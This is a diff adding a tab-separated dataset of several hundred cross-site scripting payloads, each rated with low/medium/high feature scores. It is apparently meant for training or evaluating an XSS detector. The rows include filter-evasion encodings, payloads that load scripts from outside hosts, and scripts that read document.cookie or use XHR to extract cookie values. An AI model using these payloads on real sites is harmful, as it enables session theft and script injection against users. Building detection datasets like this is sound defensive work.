@@ -1,0 +1,538 @@
+attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
+<svg onload=alert(1)>	M	L	L	L	L	L	L	M	
+"><svg onload=alert(1)//	M	L	L	L	M	L	L	M	
+"onmouseover=alert(1)//	L	L	L	L	M	L	L	M	
+"autofocus/onfocus=alert(1)//	L	L	L	L	M	L	L	M	
+</script><svg onload=alert(1)>	M	L	M	L	M	L	L	M	
+<x contenteditable onblur=alert(1)>lose focus! 	M	L	L	L	M	L	M	M	
+<x onclick=alert(1)>click this! 	M	L	L	L	M	L	M	M	
+<x oncopy=alert(1)>copy this! 	M	L	L	L	M	M	M	M	
+<x oncontextmenu=alert(1)>right click this! 	M	L	L	L	M	L	M	M	
+<x oncut=alert(1)>copy this! 	M	L	L	L	M	M	M	M	
+<x ondblclick=alert(1)>double click this! 	M	L	L	L	M	L	M	M	
+<x ondrag=alert(1)>drag this! 	M	L	L	L	M	L	M	M	
+<x contenteditable onfocus=alert(1)>focus this! 	M	L	M	L	M	L	M	M	
+<x contenteditable oninput=alert(1)>input here! 	M	L	M	L	M	L	M	M	
+<x contenteditable onkeydown=alert(1)>press any key! 	M	L	L	L	M	M	M	M	
+<x contenteditable onkeypress=alert(1)>press any key! 	M	L	L	L	M	M	M	M	
+<x contenteditable onkeyup=alert(1)>press any key! 	M	L	L	L	M	M	M	M	
+<x onmousedown=alert(1)>click this! 	M	L	L	L	M	L	M	M	
+<x onmousemove=alert(1)>hover this! 	M	L	L	L	M	L	M	M	
+<x onmouseout=alert(1)>hover this! 	M	L	L	L	M	L	M	M	
+<x onmouseover=alert(1)>hover this! 	M	L	L	L	M	L	M	M	
+<x onmouseup=alert(1)>click this! 	M	L	L	L	M	L	M	M	
+<x contenteditable onpaste=alert(1)>paste here!	M	L	L	L	M	L	M	M	
+<script>alert(1)// 	L	L	L	L	M	L	L	L	
+<script>alert(1)<!–	M	L	L	L	M	L	L	L	
+<script src=//brutelogic.com.br/1.js> 	M	L	L	L	M	L	L	M	
+<script src=//3334957647/1>	M	L	L	L	M	M	L	M	
+<x 1='1'onxxx=1 	M	L	L	L	L	M	L	L	
+<x 1="1"onxxx=1	M	L	L	L	L	M	L	L	
+<x 1=">" onxxx=1 	M	L	L	L	L	M	M	L	
+<x onxxx=alert(1) 1='	M	L	L	L	L	M	L	M	
+<svg onload=setinterval(function(){with(document)body.appendchild(createelement('script')).src='//host:port'},0)>	H	L	M	L	M	L	L	M	
+'onload=alert(1)><svg/1='	M	L	L	L	M	M	L	M	
+'>alert(1)</script><script/1=' 	M	L	L	L	M	M	L	M	
+*/alert(1)</script><script>/*	M	L	L	L	M	L	L	M	
+*/alert(1)">'onload="/*<svg/1='	H	L	L	L	M	M	L	M	
+`-alert(1)">'onload="`<svg/1='	H	L	L	L	M	M	L	M	
+*/</script>'>alert(1)/*<script/1='	M	L	L	L	M	M	L	M	
+<script>alert(1)</script> 	M	L	L	L	M	L	L	M	
+<script src=javascript:alert(1)> 	M	L	M	L	M	L	L	M	
+<iframe src=javascript:alert(1)> 	M	L	M	L	M	L	L	M	
+<embed src=javascript:alert(1)> 	M	L	M	L	M	L	L	M	
+<a href=javascript:alert(1)>click 	M	L	M	L	M	L	L	M	
+<math><brute href=javascript:alert(1)>click 	M	L	M	L	M	L	L	M	
+<form action=javascript:alert(1)><input type=submit> 	M	L	M	L	M	L	M	M	
+<isindex action=javascript:alert(1) type=submit value=click> 	M	L	M	L	M	L	M	M	
+<form><button formaction=javascript:alert(1)>click 	M	L	M	L	M	L	L	M	
+<form><input formaction=javascript:alert(1) type=submit value=click> 	M	L	M	L	M	L	M	M	
+<form><input formaction=javascript:alert(1) type=image value=click> 	M	L	M	L	M	L	M	M	
+<form><input formaction=javascript:alert(1) type=image src=source> 	M	L	M	L	M	L	M	M	
+<isindex formaction=javascript:alert(1) type=submit value=click> 	M	L	M	L	M	L	M	M	
+<object data=javascript:alert(1)> 	M	L	M	L	M	L	L	M	
+<iframe srcdoc=<svg/o&#x6eload&equals;alert&lpar;1)&gt;> 	M	L	M	L	M	L	L	M	
+<svg><script xlink:href=data:,alert(1) /> 	M	L	M	L	M	L	M	M	
+<math><brute xlink:href=javascript:alert(1)>click 	M	L	M	L	M	L	L	M	
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributename=xlink:href begin=0 from=javascript:alert(1) to=&>	L	L	M	L	M	M	M	H	
+<html ontouchstart=alert(1)> 	M	L	L	L	L	L	L	M	
+<html ontouchend=alert(1)> 	M	L	L	L	L	L	L	M	
+<html ontouchmove=alert(1)> 	M	L	L	L	L	L	L	M	
+<html ontouchcancel=alert(1)>	M	L	L	L	L	L	L	M	
+<body onorientationchange=alert(1)>	M	L	L	L	L	L	L	M	
+"><img src=1 onerror=alert(1)>.gif	M	L	M	L	M	M	L	M	
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>	H	L	M	L	M	L	L	M	
+gif89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;	M	L	M	L	M	L	L	M	
+<script src="data:&comma;alert(1)//	M	L	M	L	M	L	L	M	
+"><script src=data:&comma;alert(1)//	M	L	M	L	M	L	L	M	
+<script src="//brutelogic.com.br&sol;1.js&num; 	M	L	L	L	M	L	L	M	
+"><script src=//brutelogic.com.br&sol;1.js&num; 	M	L	L	L	M	L	L	M	
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; 	M	L	M	L	M	L	M	M	
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;	M	L	M	L	M	L	L	M	
+<base href=//0>	M	L	L	L	L	L	L	L	
+<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)	M	L	M	L	M	M	L	M	
+<body onload=alert(1)>	M	L	L	L	L	L	L	M	
+<body onpageshow=alert(1)>	M	L	L	L	L	L	L	M	
+<body onfocus=alert(1)>	M	L	L	L	L	L	L	M	
+<body onhashchange=alert(1)><a href=#x>click this!#x	H	L	M	L	M	L	M	M	
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x	M	L	M	L	M	L	M	M	
+<body onscroll=alert(1)><br><br><br><br>	L	L	M	L	L	L	L	M	
+<br><br><br><br><br><br><br><br><br><br>	L	L	M	L	L	L	L	M	
+<br><br><br><br><br><br><br><br><br><br>	L	L	M	L	L	L	L	M	
+<br><br><br><br><br><br><x id=x>#x	L	L	M	L	L	L	L	M	
+<body onresize=alert(1)>press f12!	M	L	L	L	M	M	L	M	
+<body onhelp=alert(1)>press f1! (msie)	M	L	L	L	M	M	M	M	
+<marquee onstart=alert(1)>	M	L	L	L	L	L	L	M	
+<marquee loop=1 width=0 onfinish=alert(1)>	M	L	M	L	L	M	M	M	
+<audio src onloadstart=alert(1)>	M	L	L	L	L	L	L	M	
+<video onloadstart=alert(1)><source>	M	L	L	L	L	L	L	M	
+<input autofocus onblur=alert(1)>	M	L	M	L	L	L	L	M	
+<keygen autofocus onfocus=alert(1)>	M	L	L	L	L	L	L	M	
+<form onsubmit=alert(1)><input type=submit>	M	L	M	L	L	L	L	M	
+<select onchange=alert(1)><option>1<option>2	M	L	M	L	L	M	L	M	
+<menu id=x contextmenu=x onshow=alert(1)>right click me!	M	L	M	L	M	L	M	M	
+a=alert,a(1)	L	L	L	L	M	L	L	L	
+top["al"+"ert"](1)	M	L	L	L	M	M	L	L	
+eval(url.slice(-8))>#alert(1)	L	L	L	L	M	M	L	M	
+eval(location.hash.slice(1)>#alert(1)	L	L	M	L	M	M	L	M	
+innerhtml=location.hash>#<script>alert(1)</script>	M	L	M	L	M	L	L	M	
+'%22--%3e%3c/style%3e%3c/script%3e%3cscript%3eshadowlabs(0x000045)%3c/script%3e	L	L	L	L	M	H	L	M	
+<<scr\0ipt/src=http://xss.com/xss.js></script	M	L	M	L	M	L	L	M	
+%27%22--%3e%3c%2fstyle%3e%3c%2fscript%3e%3cscript%3erwar%280x00010e%29%3c%2fscript%3e	L	L	L	L	L	H	L	M	
+' onmouseover=alert(/xss/)	L	L	L	L	M	L	L	M	
+"><iframe%20src="http://google.com"%%203e	H	L	L	L	M	M	L	M	
+'<script>window.onload=function(){document.forms[0].message.value='1';}</script>	H	L	M	L	M	M	L	M	
+x”</title><img src%3dx onerror%3dalert(1)>	M	L	M	L	M	L	L	M	
+<script> document.getelementbyid(%22safe123%22).setcapture(); document.getelementbyid(%22safe123%22).click(); </script>	H	L	M	L	M	M	M	H	
+<script>object.defineproperties(window, {safe: {value: {get: function() {return document.cookie}}}});alert(safe.get())</script>	M	L	M	L	H	L	M	H	
+<script>var x = document.createelement('iframe');document.body.appendchild(x);var xhr = x.contentwindow.xmlhttprequest();xhr.open('get', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>	L	M	M	L	L	L	M	L	
+<script>(function() {var event = document.createevent(%22mouseevents%22);event.initmouseevent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakedata = [event, {istrusted: true}, event];arguments.__definegetter__('0', function() { return fakedata.pop(); });alert(safe.get.apply(null, arguments));})();</script>	L	M	H	L	L	H	L	L	
+<script>var script = document.getelementsbytagname('script')[0]; var clone = script.childnodes[0].clonenode(true); var ta = document.createelement('textarea'); ta.appendchild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>	L	M	M	L	L	M	M	L	
+<script>xhr=new activexobject(%22msxml2.xmlhttp%22);xhr.open(%22get%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readystate==4%26%26xhr.status==200){alert(xhr.responsetext.match(/'([^']%2b)/)[1])}};xhr.send();</script>	L	L	M	L	L	H	L	L	
+<script>alert(document.documentelement.innerhtml.match(/'([^']%2b)/)[1])</script>	M	L	M	L	M	M	L	M	
+<script>alert(document.getelementsbytagname('html')[0].innerhtml.match(/'([^']%2b)/)[1])</script>	H	L	M	L	M	M	L	M	
+<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>	L	L	L	L	M	L	M	L	
+<script> var xdr = new activexobject(%22microsoft.xmlhttp%22);  xdr.open(%22get%22, %22/xssme2%3fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responsetext.match(/document.cookie = '(.*%3f)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>	L	M	M	L	L	H	L	L	
+<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getelementbyid('ifra'); ifr.contentdocument.write(%22<scr%22 %2b %22ipt>top.foo = object.defineproperty</scr%22 %2b %22ipt>%22); foo(window, 'safe', {value:{}}); foo(safe, 'get', {value:function() {    return document.cookie }}); alert(safe.get());</script>	L	L	H	L	L	H	L	L	
+<script>alert(document.head.innerhtml.substr(146,20));</script>	M	L	M	L	M	L	L	M	
+<script>alert(document.head.childnodes[3].text)</script>	M	L	M	L	M	L	L	M	
+<script>var request = new xmlhttprequest();request.open('get', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responsetext.substr(150,41));}</script>	L	M	M	L	H	L	M	L	
+<script>object.defineproperty(window, 'safe', {value:{}});object.defineproperty(safe, 'get', {value:function() {return document.cookie}});alert(safe.get())</script>	H	L	M	L	H	L	M	H	
+<script>x=document.createelement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new xmlhttprequest();r.open('get','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responsetext.substr(150,41));}<\/script>%22)};document.body.appendchild(x);</script>	L	L	H	L	L	M	L	L	
+<script>x=document.createelement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>object.defineproperty(parent,'safe',{value:{}});object.defineproperty(parent.safe,'get',{value:function(){return top.document.cookie}});alert(parent.safe.get())<\/script>%22)};document.body.appendchild(x);</script>	L	L	H	L	L	M	L	L	
+<script> var+xmlhttp+=+null; try+{ xmlhttp+=+new+xmlhttprequest(); }+catch(e)+{} if+(xmlhttp)+{ xmlhttp.open('get',+'/xssme2',+true); xmlhttp.onreadystatechange+=+function+()+{ if+(xmlhttp.readystate+==+4)+{ xmlhttp.responsetext.match(/document.cookie%5cs%2b=%5cs%2b'(.*)'/gi); alert(regexp.%241); } } xmlhttp.send(null); }; </script>	L	M	M	L	L	M	M	L	
+<script> document.getelementbyid(%22safe123%22).click=function()+{alert(safe.get());} document.getelementbyid(%22safe123%22).click({'type':'click','istrusted':true}); </script>	L	L	M	L	H	M	M	H	
+<script> var+mouseevent=function+mouseevent(){}; mouseevent=mouseevent var+test=new+mouseevent(); test.istrusted=true; test.type='click';  document.getelementbyid(%22safe123%22).click=function()+{alert(safe.get());} document.getelementbyid(%22safe123%22).click(test); </script>	L	M	M	L	L	M	M	L	
+<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('user cookie is ' %2b x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__definegetter__('istrusted', function () { return true; });    exploit(safe.get());   };      var e = document.createevent('mouseevent');   e.initevent('click', true, true);   o.dispatchevent(e);  })(document.getelementbyid('safe123')); </script>	L	M	H	L	L	M	L	L	
+<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253dnew%2520this.contentwindow.window.xmlhttprequest%2528%2529%253bfff.open%2528%2522get%2522%252c%2522xssme2%2522%2529%253bfff.onreadystatechange%253dfunction%2528%2529%257bif%2520%2528fff.readystate%253d%253d4%2520%2526%2526%2520fff.status%253d%253d200%2529%257balert%2528fff.responsetext%2529%253b%257d%257d%253bfff.send%2528%2529%253b></iframe>	L	L	M	L	H	L	M	L	
+<script>     function b() { return safe.get(); } alert(b({type:string.fromcharcode(99,108,105,99,107),istrusted:true})); </script> 	M	L	M	L	H	L	M	H	
+<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerdocument.cookie) width=0 height= 0 /> #	M	L	M	L	M	M	M	M	
+<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__definegetter__(text[0], function () { return true })    alert(safe.get());   };      var event = doc.createevent(text[1]);   event.initevent(text[2], true, true);   elem.dispatchevent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerdocument,this.name.split(/,/)) name=istrusted,mouseevent,click width=0 height=0 /> # 	L	L	H	L	L	M	L	L	
+<script+for=document+event=onreadystatechange>mouseevent=function+mouseevent(){};test=new+mouseevent();test.istrusted=true;test.type=%22click%22;getelementbyid(%22safe123%22).click=function()+{alert(safe.get());};getelementbyid(%22safe123%22).click(test);</script>#	L	L	M	L	L	M	L	L	
+<script> var+xmlhttp+=+null; try+{ xmlhttp+=+new+xmlhttprequest(); }+catch(e)+{} if+(xmlhttp)+{ xmlhttp.open('get',+'/xssme2',+true); xmlhttp.onreadystatechange+=+function+()+{ if+(xmlhttp.readystate+==+4)+{ xmlhttp.responsetext.match(/document.cookie%5cs%2b=%5cs%2b'(.*)'/gi); alert(regexp.%241); } } xmlhttp.send(null); }; </script>#	L	M	M	L	L	M	M	L	
+<video+onerror='javascript:mouseevent=function+mouseevent(){};test=new+mouseevent();test.istrusted=true;test.type=%22click%22;document.getelementbyid(%22safe123%22).click=function()+{alert(safe.get());};document.getelementbyid(%22safe123%22).click(test);'><source>%23	L	L	M	L	L	M	L	L	
+<script for=document event=onreadystatechange>getelementbyid('safe123').click()</script>	H	L	M	L	M	L	L	M	
+<script> var+x+=+showmodelessdialog+(this); alert(x.document.cookie); </script>	M	L	M	L	M	L	M	M	
+<script> location.href = 'data:text/html;base64,phnjcmlwdd54pw5ldybytuxidhrwumvxdwvzdcgpo3gub3blbigir0vuiiwiahr0cdovl3hzc21llmh0bww1c2vjlm9yzy94c3ntztiviix0cnvlktt4lm9ubg9hzd1mdw5jdglvbigpihsgywxlcnqoec5yzxnwb25zzvrlehqubwf0y2gol2rvy3vtzw50lmnvb2tpzsa9iccolio/kscvkvsxxsl9o3guc2vuzchudwxskts8l3njcmlwdd4='; </script>	H	L	M	L	M	L	M	L	
+<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new xmlhttprequest();r.open('get','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responsetext.substr(150,41));}<\/script>%26quot;)%22></iframe>	L	L	M	L	L	M	M	L	
+<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new xmlhttprequest();r.open('get','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responsetext.substr(150,41));}<\/script>%26quot;)%22></iframe>	L	L	M	L	L	M	M	L	
+<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new xmlhttprequest();r.open('get','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responsetext.substr(150,41));}<\/script>%26quot;)%22></iframe>	L	L	M	L	L	M	M	L	
+<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new xmlhttprequest();r.open('get','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responsetext.substr(150,41));}<\/script>%26quot;)%22></iframe>	L	L	M	L	L	M	M	L	
+<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { istrusted: true };var a = [event, o, event];var get;event.__definegetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__definegetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#	L	M	H	L	L	M	L	L	
+<iframe onload=%22write('<script>'%2blocation.hash.substr(1)%2b'</script>')%22></iframe>#var xhr = new xmlhttprequest();xhr.open('get', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();	L	L	M	L	L	M	M	L	
+<textarea id=ta></textarea><script>ta.appendchild(safe123.parentnode.previoussibling.previoussibling.childnodes[3].firstchild.clonenode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>	L	L	M	L	H	M	M	L	
+<textarea id=ta onfocus=console.dir(event.currenttarget.ownerdocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253d%2520new%2520xmlhttprequest()%253bxhr.open('get'%252c%2520'http%253a%252f%252fhtml5sec.org%252fxssme2'%252c%2520true)%253bxhr.onload%2520%253d%2520function()%2520%257b%2520alert(xhr.responsetext.match(%252fcookie%2520%253d%2520'(.*%253f)'%252f)%255b1%255d)%2520%257d%253bxhr.send()%253b%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>	L	L	H	L	L	L	M	L	
+<iframe onload=%22write('<script>'%2blocation.hash.substr(1)%2b'</script>')%22></iframe>#var xhr = new xmlhttprequest();xhr.open('get', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();	L	L	M	L	L	M	M	L	
+<textarea id=ta></textarea><script>ta.appendchild(safe123.parentnode.previoussibling.previoussibling.childnodes[3].firstchild.clonenode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>	L	L	M	L	H	M	M	L	
+<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.xmlhttprequest();xhr.open('get', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();	L	L	H	L	L	M	H	L	
+<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>	L	L	M	L	M	M	M	M	
+<object data=%22data:text/html;base64,phnjcmlwdd4gdmfyihhocia9ig5ldybytuxidhrwumvxdwvzdcgpoyb4ahiub3blbignr0vujywgj2h0dha6ly94c3ntzs5odg1snxnlyy5vcmcvehnzbwuyjywgdhj1zsk7ihhoci5vbmxvywqgpsbmdw5jdglvbigpihsgywxlcnqoeghylnjlc3bvbnnlvgv4dc5tyxrjacgvy29va2llid0gjygukj8pjy8pwzfdksb9oyb4ahiuc2vuzcgpoya8l3njcmlwdd4=%22>	M	L	L	L	M	L	L	L	
+<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.xmlhttprequest();xhr.open('get', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();	L	L	H	L	L	M	H	L	
+%3cscript%3exhr=new%20activexobject%28%22msxml2.xmlhttp%22%29;xhr.open%28%22get%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readystate==4%26%26xhr.status==200%29{alert%28xhr.responsetext.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3c/script%3e	L	L	M	L	H	L	L	L	
+<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new xmlhttprequest();xhr.open('get','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readystate==4%26%26xhr.status==200){alert(xhr.responsetext.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>	L	L	M	L	L	M	M	L	
+<a target="x" href="xssme?xss=%3cscript%3eaddeventlistener%28%22domframecontentloaded%22,%20function%28e%29%20{e.stoppropagation%28%29;},%20true%29;%3c/script%3e%3ciframe%20src=%22data:text/html,%253cscript%253eobject.defineproperty%28top,%20%27myevent%27,%20{value:%20object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.safe.get%28%29%29;};event%20=%20new%20object%28%29;event.type%20=%20%27click%27;event.istrusted%20=%20true;y%28event%29;%253c/script%253e%22%3e%3c/iframe%3e	L	L	H	L	H	L	L	L	
+<a target="x" href="xssme?xss=<script>var cl=components;var fcc=string.fromcharcode;doc=cl.lookupmethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupmethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,phnjcmlwdd5ldmfskgf0b2iobmftzskppc9zy3jpchq%2b name=zg9jpunvbxbvbmvudhmubg9va3vwtwv0ag9kkhrvcc50b3asj2rvy3vtzw50jykoktt2yxigzmlyzu9uvghpcya9icbkb2muz2v0rwxlbwvudej5swqoj3nhzmuxmjmnktt2yxigzxzpymogpsbkb2n1bwvudc5jcmvhdgvfdmvudcgntw91c2vfdmvudhmnkttldk9iai5pbml0tw91c2vfdmvudcggj2nsawnrjywgdhj1zswgdhj1zswgd2luzg93lcaxlcaxmiwgmzq1lca3lcaymjasigzhbhnllcbmywxzzswgdhj1zswgzmfsc2usidasig51bgwgkttldk9iai5fx2rlzmluzudldhrlcl9fkcdpc1rydxn0zwqnlgz1bmn0aw9ukcl7cmv0dxjuihrydwv9kttmdw5jdglvbib4echjkxtyzxr1cm4gdg9wllnhzmuuz2v0kcl9o2fszxj0khh4kgv2t2jqksk></iframe>	L	M	M	L	H	M	M	L	
+<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getselection().getrangeat(0).startcontainer.ownerdocument; console.log(doc); var xpe = new xpathevaluator(); var nsresolver = xpe.creatensresolver(doc); var result = xpe.evaluate('//script/text()', doc, nsresolver, 0, null); alert(result.iteratenext().data.match(/cookie = '(.*?)'/)[1])</script>	L	M	M	L	L	M	L	L	
+<a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.xmlhttprequest();xhr.open('get', '.', true);xhr.onload = function() { alert(xhr.responsetext.match(/cookie = '(.*?)'/)[1]) };xhr.send();	L	L	H	L	L	M	H	L	
+garethy salty method!<script>alert(components.lookupmethod(components.lookupmethod(components.lookupmethod(components.lookupmethod(this,'window')(),'document')(), 'getelementsbytagname')('html')[0],'innerhtml')().match(/d.*'/));</script>	L	L	M	L	L	M	M	L	
+<a href="javascript&colon;\u0061&#x6c;&#101%72t&lpar;1&rpar;"><button>	H	L	M	L	M	M	L	M	
+<div onmouseover='alert&lpar;1&rpar;'>div</div>	M	L	M	L	M	L	L	M	
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">	H	L	M	L	M	M	L	M	
+<a href="javascript&colon;alert&lpar;1&rpar;">x</a>	M	L	M	L	M	L	L	M	
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_x.pdf"> ?	M	L	L	L	M	M	L	M	
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_x.pdf">?	M	L	L	L	M	M	L	M	
+<var onmouseover="prompt(1)">on mouse over</var>?	M	M	L	L	M	L	M	M	
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>click here</a>	M	L	M	L	M	L	L	M	
+<img src="/" =_=" title="onerror='prompt(1)'">	L	L	M	L	M	L	M	M	
+<%<!--'%><script>alert(1);</script -->	H	L	L	L	M	L	L	M	
+<script src="data:text/javascript,alert(1)"></script>	M	L	M	L	M	L	L	M	
+<iframe/src \/\/onload = prompt(1)	L	L	M	L	M	L	M	M	
+<iframe/onreadystatechange=alert(1)	L	L	L	L	M	L	L	M	
+<svg/onload=alert(1)	L	L	L	L	M	L	L	L	
+<input value=<><iframe/src=javascript:confirm(1)	M	L	M	L	M	L	L	M	
+<input type="text" value=``<div/onmouseover='alert(1)'>x</div>	L	L	M	L	M	L	L	M	
+http://www.<script>alert(1)</script .com	M	L	M	L	M	L	L	M	
+<iframe  src=j&newline;&tab;a&newline;&tab;&tab;v&newline;&tab;&tab;&tab;a&newline;&tab;&tab;&tab;&tab;s&newline;&tab;&tab;&tab;&tab;&tab;c&newline;&tab;&tab;&tab;&tab;&tab;&tab;r&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;i&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;p&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;t&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&colon;a&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;l&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;e&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;r&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;t&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;%28&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;1&newline;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;&tab;%29></iframe> ?	M	L	M	L	L	M	M	L	
+<svg><script ?>alert(1)	M	L	L	L	M	L	L	M	
+<iframe  src=j&tab;a&tab;v&tab;a&tab;s&tab;c&tab;r&tab;i&tab;p&tab;t&tab;:a&tab;l&tab;e&tab;r&tab;t&tab;%28&tab;1&tab;%29></iframe>	M	L	M	L	H	M	L	H	
+<img src=`xx:xx`onerror=alert(1)>	M	L	L	L	M	L	L	M	
+<object type="text/x-scriptlet" data="http://jsfiddle.net/xle63/ "></object>	H	L	M	L	M	L	M	M	
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?	H	L	M	L	M	M	L	M	
+<math><a xlink:href="//jsfiddle.net/t846h/">click	M	L	M	L	M	L	L	M	
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?	M	L	L	L	M	L	L	M	
+<svg contentscripttype=text/vbs><script>msgbox+1	M	L	L	L	L	L	L	M	
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6c;&#101%72t(1)>">x</a	L	L	M	L	M	M	L	M	
+<iframe/onreadystatechange=\u0061\u006c\u0065\u0072\u0074('\u0061') worksinie>	M	L	L	L	M	L	L	M	
+<script>~'\u0061' ;  \u0074\u0068\u0072\u006f\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006c\u0065\u0072\u0074(~'\u0061')</script u+	M	L	L	L	H	L	M	H	
+<script/src="data&colon;text%2fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2f	L	L	M	L	M	L	M	M	
+<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6c%65%72%74(/xss/)></script ????????????	L	L	M	L	H	H	L	H	
+<object data=javascript&colon;\u0061&#x6c;&#101%72t(1)>	M	L	L	L	M	M	L	M	
+<script>+-+-1-+-+alert(1)</script>	M	L	L	L	M	M	L	M	
+<body/onload=&lt;!--&gt;&#10alert(1)>	M	L	L	L	M	L	L	M	
+<script itworksinallbrowsers>/*<script* */alert(1)</script ?	M	L	L	L	M	L	M	M	
